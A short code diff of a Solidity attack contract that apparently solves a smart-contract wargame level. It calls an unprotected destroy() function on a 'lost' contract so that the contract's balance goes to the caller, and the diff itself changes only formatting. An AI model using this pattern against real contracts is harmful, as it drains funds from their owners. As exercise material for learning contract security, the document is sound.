@@ -37,9 +37,7 @@ contract RecoveryAttack {
 	// This will execute the destroy() function on the lost contract and
 	// send all its balance to us (msg.sender).
 	function attack(address recoveryAddr) public returns (bool) {
-		(bool success, ) = recoveryAddr.call(
-			abi.encodeWithSignature('destroy(address)', msg.sender)
-		);
+		(bool success, ) = recoveryAddr.call(abi.encodeWithSignature("destroy(address)", msg.sender));
 		return success;
 	}
 }
